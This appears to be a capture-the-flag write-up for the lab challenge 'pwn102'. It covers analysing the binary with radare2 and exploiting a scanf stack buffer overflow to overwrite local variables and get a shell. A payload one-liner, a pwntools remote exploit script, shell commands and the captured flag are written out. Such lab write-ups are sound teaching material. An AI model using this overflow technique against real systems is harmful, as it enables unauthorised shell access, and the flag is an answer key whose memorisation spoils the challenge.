# pwn102

- [Binary Analysis](#binary-analysis)
- [Local Exploitation](#local-exploitation)
- [Remote Exploitation](#remote-exploitation)

```text

The challenge is running on port 9002

```

## Binary Analysis 

```bash
$ ls
pwn102

$ file pwn102 
pwn102: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2612b87a7803e0a8af101dc39d860554c652d165, not stripped

$ checksec --file=pwn102
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

```

The *radare2* tool is used to further analyze the track.

```text
[0x00000780]> afl
0x00000710    1      6 sym.imp.puts
0x00000720    1      6 sym.imp.system
0x00000730    1      6 sym.imp.printf
0x00000740    1      6 sym.imp.setvbuf
0x00000750    1      6 sym.imp.__isoc99_scanf
0x00000760    1      6 sym.imp.exit
0x00000770    1      6 sym.imp.__cxa_finalize
0x00000780    1     42 entry0
0x000007b0    4     40 sym.deregister_tm_clones
0x000007f0    4     57 sym.register_tm_clones
0x00000840    5     51 entry.fini0
0x00000880    1     10 entry.init0
0x00000a20    1      2 sym.__libc_csu_fini
0x00000a24    1      9 sym._fini
0x000008eb    1     19 sym.banner
0x000009b0    4    101 sym.__libc_csu_init
0x000008fe    5    172 main
0x0000088a    1     97 sym.setup
0x000006e0    3     23 sym._init

```

Among the symbols, the *main* function is identified.

We proceed with the inspection of the disassembled code of the *main* function.

```bash
[0x00000780]> s main 
[0x000008fe]> pdf
            ; ICOD XREF from entry0 @ 0x79d(r)
┌ 172: int main (int argc, char **argv, char **envp);
│ afv: vars(3:sp[0xc..0x78])
│           0x000008fe      55             push rbp
│           0x000008ff      4889e5         mov rbp, rsp
│           0x00000902      4883ec70       sub rsp, 0x70
│           0x00000906      b800000000     mov eax, 0
│           0x0000090b      e87affffff     call sym.setup
│           0x00000910      b800000000     mov eax, 0
│           0x00000915      e8d1ffffff     call sym.banner
│           0x0000091a      c745fc0df0..   mov dword [var_4h], 0xbadf00d
│           0x00000921      c745f8adde..   mov dword [var_8h], 0xfee1dead
│           0x00000928      8b55f8         mov edx, dword [var_8h]
│           0x0000092b      8b45fc         mov eax, dword [var_4h]
│           0x0000092e      89c6           mov esi, eax
│           0x00000930      488d3d1202..   lea rdi, "I need %x to %x\nAm I right? "; const char *format
│           0x00000937      b800000000     mov eax, 0
│           0x0000093c      e8effdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00000941      488d4590       lea rax, [var_70h]
│           0x00000945      4889c6         mov rsi, rax
│           0x00000948      488d3d1702..   lea rdi, [0x00000b66]       ; "%s" ; const char *format
│           0x0000094f      b800000000     mov eax, 0
│           0x00000954      e8f7fdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00000959      817dfc33ff..   cmp dword [var_4h], 0xc0ff33
│       ┌─< 0x00000960      7530           jne 0x992
│       │   0x00000962      817df8d3c0..   cmp dword [var_8h], 0xc0d3
│      ┌──< 0x00000969      7527           jne 0x992
│      ││   0x0000096b      8b55f8         mov edx, dword [var_8h]
│      ││   0x0000096e      8b45fc         mov eax, dword [var_4h]
│      ││   0x00000971      89c6           mov esi, eax
│      ││   0x00000973      488d3def01..   lea rdi, "Yes, I need %x to %x\n" ; const char *format
│      ││   0x0000097a      b800000000     mov eax, 0
│      ││   0x0000097f      e8acfdffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x00000984      488d3df401..   lea rdi, "/bin/sh"          ; const char *string
│      ││   0x0000098b      e890fdffff     call sym.imp.system         ; int system(const char *string)
│     ┌───< 0x00000990      eb16           jmp 0x9a8
│     │││   ; CODE XREFS from main @ 0x960(x), 0x969(x)
│     │└└─> 0x00000992      488d3def01..   lea rdi, "I'm feeling dead, coz you said I need bad food :(" ; const char *s
│     │     0x00000999      e872fdffff     call sym.imp.puts           ; int puts(const char *s)
│     │     0x0000099e      bf39050000     mov edi, 0x539              ; int status
│     │     0x000009a3      e8b8fdffff     call sym.imp.exit           ; void exit(int status)
│     │     ; CODE XREF from main @ 0x990(x)
│     └───> 0x000009a8      c9             leave
└           0x000009a9      c3             ret

[0x000008fe]> afv
var uint32_t var_4h @ rbp-0x4
var uint32_t var_8h @ rbp-0x8
var int64_t var_70h @ rbp-0x70
```

The idea is to exploit the **buffer overflow vulnerability** on `scanf("%s", &var_70h)` to overwrite the local variables on the stack and pass the check to run a `system("/bin/sh")`.

Payload:

- **padding** size=0x70-0x8=104 bytes to fill the buffer.
- **value2**=0xc0d3 `var_8h @ rbp-0x8`.
- **value1**=0xc0ff33 `var_4h @ rbp-0x4`.

## Local Exploitation

The value to write on the stack LSB byte format:
- **value1**: `\xd3\xc0\x00\x00`
- **value2**: `\x33\xff\xc0\x00`

Let's create the payload.

```bash
$ python2 -c 'print b"A"*104+b"\xd3\xc0\x00\x00"+b"\x33\xff\xc0\x00"' > payload

$ xxd payload 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 d3c0 0000 33ff c000  AAAAAAAA....3...
00000070: 0a 
```

The exploit is run locally.

```bash
$ ./pwn102 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? AAA
I' m feeling dead, coz you said I need bad food :(

$ # Exploit the BOF

$ ./pwn102 < payload 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3

```

It works locally but does not return the shell.

## Remote Exploitation

Build and run the `exploit` script and use the *pwntools* library.

`exploit`

```python
#!/usr/bin/env python3
from pwn import remote

HOST, PORT='10.10.34.41', 9002

### Crafting Payload
payload = b'A'*104 + b'\xd3\xc0\x00\x00' + b'\x33\xff\xc0\x00'

### Remote Exploit
io=remote(HOST, PORT)
io.sendline(payload)
io.interactive()

```

The exploit is executed remotely by running the *script*.

```bash
$ ./exploit 
[+] Opening connection to 10.10.34.41 on port 9002: Done
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
$ 
[*] Closed connection to 10.10.34.41 port 9002
```

Flag captured.

---
